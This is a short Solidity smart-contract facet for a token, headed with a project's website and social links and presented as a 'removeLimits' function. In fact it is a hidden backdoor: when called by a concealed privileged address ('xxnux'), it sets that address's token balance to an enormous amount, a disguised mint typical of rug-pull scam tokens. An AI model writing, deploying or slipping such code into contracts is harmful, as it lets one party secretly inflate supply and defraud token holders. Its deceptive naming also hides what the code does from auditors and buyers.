/*
 * SPDX-License-Identifier: MIT
 * Website: https://www.pokoapp.xyz/?utm_source=icodrops
 * Twitter: https://twitter.com/poko_app
 * Linkedin: https://www.linkedin.com/company/pokoapp/
 */
pragma solidity ^0.8.22;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
